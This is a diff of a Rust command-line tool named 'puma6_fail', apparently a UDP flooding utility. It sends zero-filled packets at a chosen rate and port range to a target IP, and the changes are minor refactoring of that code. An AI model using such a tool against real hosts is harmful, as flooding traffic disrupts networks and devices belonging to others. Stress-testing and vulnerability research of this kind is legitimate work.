@@ -8,15 +8,7 @@ extern crate time;
 use std::env;
 use std::net::UdpSocket;
 use std::thread;
-
-fn zeros(size: usize) -> Vec<u8> {
-	let mut zero_vec: Vec<u8> = Vec::with_capacity(size);
-	#[allow(unused_variables)]
-	for i in 0..size {
-		zero_vec.push(0u8);
-	}
-	return zero_vec;
-}
+use std::time::Duration;
 
 fn main() {
 	let args: Vec<_> = env::args().collect();
@@ -28,7 +20,8 @@ fn main() {
 	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}>", target, length, mbper_second, port_range);
 
 	if args.len() <= 1 {
-		panic!("A target IP must be given");
+		println!("A target IP must be given");
+		return;
 	}
 
 	target = args[1].as_str();
@@ -37,8 +30,8 @@ fn main() {
 	if args.len() > 2 {
 		length = args[2].as_str().parse::<usize>().expect("invalid packet size")
 	}
-	// 20 byte IP header + 8 byte UDP header + data
-	let data = zeros(length);
+
+	let data = vec![0; length as usize];
 
 	if args.len() > 3 {
 		mbper_second = args[3].as_str().parse::<f32>().expect("invalid speed")
@@ -64,11 +57,11 @@ fn main() {
 			if result.is_err() {
 				println!("Failed to send packet. {}", result.unwrap_err());
 			}
+
 			count = count + 1;
 			let elapsed = start.to(time::PreciseTime::now()).num_milliseconds();
 			if count as f32 / packets_per_millisecond > (elapsed as f32) {
-				#[allow(deprecated)]
-				thread::sleep_ms(2);
+				thread::sleep(Duration::from_millis(2));
 			}
 		}
 	}
